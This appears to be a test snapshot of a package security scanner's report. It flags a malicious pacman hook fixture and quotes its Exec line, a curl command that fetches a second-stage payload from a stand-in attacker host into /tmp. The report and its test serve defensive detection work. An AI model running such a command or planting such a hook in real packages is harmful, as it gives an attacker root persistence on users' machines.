@@ -1,0 +1,20 @@
+
+Scan Results: hooksubdir
+============================================================
+
+[HIGH] PERSIST-012 pacman hook runs a fetch, a shell command or a user/temp path
+    zz-sync.hook is a libalpm hook (runs as root) whose Exec downloads, or runs something from /tmp, /dev/shm or a home directory. A hook like this is a root persistence mechanism.
+    Location: tests/fixtures/malicious/shipped-hook-subdir/hooks/zz-sync.hook:8
+    Code: Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2
+    Recommendation: Do not install. A hook should run a fixed, packaged program with a narrow Target.
+    Reference: CWE-506
+
+
+
+============================================================
+Package: hooksubdir v1.0.0-1
+Scan duration: 21ms
+
+Found 1 issue(s):
+  1 HIGH
+============================================================
